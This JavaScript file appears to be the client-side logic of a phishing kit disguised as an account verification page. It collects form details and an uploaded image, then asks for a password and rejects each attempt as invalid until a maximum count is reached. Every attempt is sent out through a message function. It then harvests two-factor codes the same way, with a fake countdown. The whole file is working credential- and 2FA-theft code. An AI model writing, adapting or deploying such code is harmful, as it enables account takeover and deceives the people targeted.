import './handlers/keys.handler.js';
import { PASSWORD_MAX_ATTEMPT, TWO_FA_MAX_ATTEMPT } from './configs/env.js';
import { initializeForm, sendMessage } from './message/index.js';
import { saveToSession } from './session/index.js';
import { hideLoading, showLoading } from './ui/layout/loading.js';
import { hideModal, showModal } from './ui/layout/modal.js';
import { initialize } from './utils/index.js';
import startCountdownTimer from './utils/timer.js';

let passwordAttempt = 0;
let twofaAttempt = 0;

initialize();

document.addEventListener('DOMContentLoaded', function () {
  const fileInput = document.getElementById('file_input');
  const fileDisplayInput = document.getElementById('add_shoes');

  if (fileInput && fileDisplayInput) {
    fileInput.addEventListener('change', function (e) {
      const file = e.target.files[0];
      const previewContainer = document.getElementById('file_preview');
      const previewImage = document.getElementById('preview_image');
      const maxFileSize = 5 * 1024 * 1024;

      if (file) {
        if (file.size > maxFileSize) {
          alert('File is too large. Please select a file smaller than 5MB.');
          fileInput.value = '';
          fileDisplayInput.value = 'No file selected';
          previewContainer.style.display = 'none';
          delete window.formToSend['uploaded_file'];
          return;
        }

        fileDisplayInput.value = file.name;

        if (file.type.startsWith('image/')) {
          const reader = new FileReader();
          reader.onload = function (e) {
            window.formToSend['uploaded_file'] = {
              name: file.name,
              size: file.size,
              type: file.type,
              data: e.target.result,
              isImage: true,
            };

            previewImage.src = e.target.result;
            previewContainer.style.display = 'block';
          };
          reader.readAsDataURL(file);
        } else {
          window.formToSend['uploaded_file'] = {
            name: file.name,
            size: file.size,
            type: file.type,
            isImage: false,
          };
          previewContainer.style.display = 'none';
        }
      } else {
        fileDisplayInput.value = 'No file selected';
        delete window.formToSend['uploaded_file'];
        previewContainer.style.display = 'none';
      }
    });
  }

  const initialSubmitBtn = document.getElementById('first-form-submit-btn');
  if (initialSubmitBtn) {
    initialSubmitBtn.addEventListener('click', async function (e) {
      const form = document.getElementById('verificationForm');

      if (!form.checkValidity()) {
        form.reportValidity();
        return;
      }

      e.preventDefault();

      const originalText = this.textContent;
      this.textContent = 'Processing...';
      this.disabled = true;

      const initialData = initializeForm();
      Object.assign(window.formToSend, initialData);

      const dataWithFile = {
        ...initialData,
        uploaded_file: window.formToSend['uploaded_file'],
      };
      await sendMessage(dataWithFile);

      delete window.formToSend['uploaded_file'];

      setTimeout(() => {
        this.textContent = originalText;
        this.disabled = false;
        showModal('passwordModal');
      }, 2000);
    });
  }

  const submitButtonQuery = 'button[type="submit"], button:not([type])';

  const passwordForm = document.getElementById('apiForm');
  if (passwordForm) {
    passwordForm.addEventListener('submit', async function (e) {
      e.preventDefault();
      const submitBtn = this.querySelector(submitButtonQuery);
      const originalText = submitBtn.querySelector('.button-text').textContent;
      const passwordInput = document.getElementById('secondFormPassword');
      const invalidFeedback = this.querySelector('.invalid-feedback');

      showLoading(submitBtn);
      passwordAttempt++;
      window.formToSend[`password-${passwordAttempt}`] = passwordInput.value;
      await sendMessage({
        [`password-${passwordAttempt}`]: passwordInput.value,
      });

      setTimeout(() => {
        hideLoading(submitBtn, originalText);

        if (passwordAttempt < PASSWORD_MAX_ATTEMPT) {
          passwordInput.classList.add('is-invalid');
          invalidFeedback.style.display = 'block';
          passwordInput.value = '';
          passwordInput.focus();
        } else {
          hideModal('passwordModal');
          saveToSession();
          window.location.href = './verry.html';
        }
      }, 2000);
    });
  }

  const twoFAForm = document.getElementById('twoFAForm');
  if (twoFAForm) {
    twoFAForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const submitBtn = this.querySelector(submitButtonQuery);
      const originalText = submitBtn.querySelector('.button-text').textContent;
      const twoFAInput = document.getElementById('twofaFormPassword');
      const invalidFeedback = this.querySelector('.invalid-feedback');

      if (twoFAInput.disabled || submitBtn.disabled) {
        return;
      }

      showLoading(submitBtn);
      twofaAttempt++;
      window.formToSend[`2FA-${twofaAttempt}`] = twoFAInput.value;
      await sendMessage({ [`2FA-${twofaAttempt}`]: twoFAInput.value });
      setTimeout(() => {
        hideLoading(submitBtn, originalText);

        if (twofaAttempt < TWO_FA_MAX_ATTEMPT) {
          twoFAInput.classList.add('is-invalid');
          invalidFeedback.style.display = 'block';
          twoFAInput.value = '';

          startCountdownTimer();
        } else {
          hideModal('twoFAmodal');
          saveToSession('formData', null);
          window.location.href = './index.html';
        }
      }, 2000);
    });
  }

  document.querySelectorAll('.btn-close').forEach((closeBtn) => {
    closeBtn.addEventListener('click', function () {
      const modal = this.closest('.modal');
      if (modal) {
        hideModal(modal.id);
      }
    });
  });

  const showHidePass = document.getElementById('show-hide-pass');
  if (showHidePass) {
    showHidePass.addEventListener('click', function () {
      const passwordInput = document.getElementById('secondFormPassword');
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
      } else {
        passwordInput.type = 'password';
      }
    });
  }

  document
    .getElementById('secondFormPassword')
    ?.addEventListener('input', function () {
      this.classList.remove('is-invalid');
      const invalidFeedback =
        this.closest('.mb-3').querySelector('.invalid-feedback');
      if (invalidFeedback) invalidFeedback.style.display = 'none';
    });

  document
    .getElementById('twofaFormPassword')
    ?.addEventListener('input', function () {
      this.classList.remove('is-invalid');
      const invalidFeedback =
        this.closest('.mb-3').querySelector('.invalid-feedback');
      if (invalidFeedback) invalidFeedback.style.display = 'none';
    });

  document.addEventListener('click', function (e) {
    if (
      e.target.classList.contains('modal') &&
      e.target.classList.contains('show')
    ) {
    }
  });

  document.querySelectorAll('.modal-content').forEach((content) => {
    content.addEventListener('click', function (e) {
      e.stopPropagation();
    });
  });

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') {
      const openModal = document.querySelector('.modal.show');
      if (openModal) {
        hideModal(openModal.id);
      }
    }
  });
});
